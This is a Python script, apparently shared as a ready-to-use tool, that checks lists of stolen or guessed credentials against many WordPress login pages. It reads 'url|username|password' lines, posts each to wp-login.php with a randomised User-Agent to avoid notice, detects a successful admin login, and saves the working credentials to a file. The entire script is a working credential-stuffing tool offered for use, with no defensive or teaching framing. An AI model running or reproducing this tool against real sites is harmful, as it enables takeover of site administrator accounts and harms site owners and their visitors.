from fake_useragent import UserAgent
from colorama import *
import requests, re

cookies = {
    "cookielawinfo-checkbox-necessary":"yes",
    "cookielawinfo-checkbox-non-necessary":"yes",
    "_ga":"GA1.2.1541860671.1611330358",
    "_gid":"GA1.2.1655560151.1611330358",
    "viewed_cookie_policy":"yes",
    "wordpress_test_cookie":"WP%20Cookie%20check"
}

def giris_yap(url, usr, pss):
    try:
        req = requests.get(url, headers={
            "User-Agent": UserAgent().random
        })
        submit_buton = re.findall('type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="(.*?)"', req.text)[0]
        redirect_to = re.findall('type="hidden" name="redirect_to" value="(.*?)"', req.text)[0]
        data = {
            "log": usr,
            "pwd": pss,
            "wp-submit": submit_buton,
            "redirect_to": redirect_to,
            "testcookie": "1"
        }
        req2 = requests.post(url, data=data, headers={
            "User-Agent": UserAgent().random
        }, cookies=cookies)
        if ("wp-admin-bar-root-default" in req2.text):
            return True
        else:
            return False
    except KeyboardInterrupt:
        exit()
    except:
        return False


def dosya_oku(dosya):
    site_listesi = []
    with open(dosya, "r", encoding="utf-8") as siteler:
        for site in siteler.readlines():
            site_listesi.append(site.strip())
    return site_listesi


def banner():
    print(f"""
:

    {Fore.LIGHTBLUE_EX}WordPress Login Checker - Will Graham{Style.RESET_ALL}

    Format: https://www.abc.com/wp-login.php|username|password

    """)


def main():
    banner()
    liste = dosya_oku(input("Site listesi: "))
    kayit = open(input("Kayıt edilmesini istediğiniz dosya: "), "w")
    for item in liste:
        url = item.split("|")[0]
        usr = item.split("|")[1]
        pss = item.split("|")[2]
        durum = giris_yap(url, usr, pss)
        if durum:
            print(f"{Fore.GREEN}  + {Fore.WHITE}Giriş başarılı --> {item}")
            kayit.write(item+"\n")
        else:
            print(f"{Fore.RED}  + {Fore.WHITE}Giriş başarısız --> {item}")
    kayit.close()

if (__name__ == "__main__"):
    try:
        init()
        main()
    except KeyboardInterrupt:
        exit()
